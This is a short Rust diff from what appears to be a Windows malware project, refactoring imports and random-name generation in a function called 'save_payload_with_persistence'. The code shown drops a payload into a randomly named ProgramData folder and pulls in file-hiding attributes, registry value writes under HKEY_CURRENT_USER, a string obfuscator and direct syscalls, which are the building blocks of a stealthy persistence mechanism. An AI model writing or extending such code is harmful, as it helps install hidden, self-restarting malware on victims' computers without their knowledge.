@@ -1,19 +1,17 @@
 use crate::syscalls;
 use hex::ToHex;
 use obfuscator::{obfuscate, obfuscate_string};
-use rand::{thread_rng, Rng};
+use rand::Rng;
 use std::ffi::OsStr;
 use std::fs;
 use std::iter::once;
 use std::mem;
 use std::os::windows::ffi::OsStrExt;
 use std::ptr;
-use winapi::um::fileapi::SetFileAttributesW;
-use winapi::um::winreg::{RegSetValueExW, HKEY_CURRENT_USER};
 use windows_sys::Win32::Foundation::HANDLE;
-use windows_sys::Win32::Storage::FileSystem::FILE_ATTRIBUTE_HIDDEN;
+use windows_sys::Win32::Storage::FileSystem::{SetFileAttributesW, FILE_ATTRIBUTE_HIDDEN};
 use windows_sys::Win32::System::Registry::{
-    RegCloseKey, RegOpenKeyExW, KEY_SET_VALUE, REG_SZ,
+    RegCloseKey, RegOpenKeyExW, RegSetValueExW, HKEY_CURRENT_USER, KEY_SET_VALUE, REG_SZ,
 };
 
 #[cfg(windows)]
@@ -88,8 +86,8 @@ pub unsafe fn save_payload_with_persistence(payload_data: &[u8]) -> Result<(), S
         program_data.pop();
     }
 
-    let mut rng = thread_rng();
-    let random_bytes: Vec<u8> = (0..6).map(|_| rng.random::<u8>()).collect();
+    let mut rng = rand::thread_rng();
+    let random_bytes: Vec<u8> = (0..6).map(|_| rng.gen::<u8>()).collect();
     let dir_name: String = random_bytes.encode_hex();
 
     let folder_path = format!("{}\\{}", program_data, dir_name);
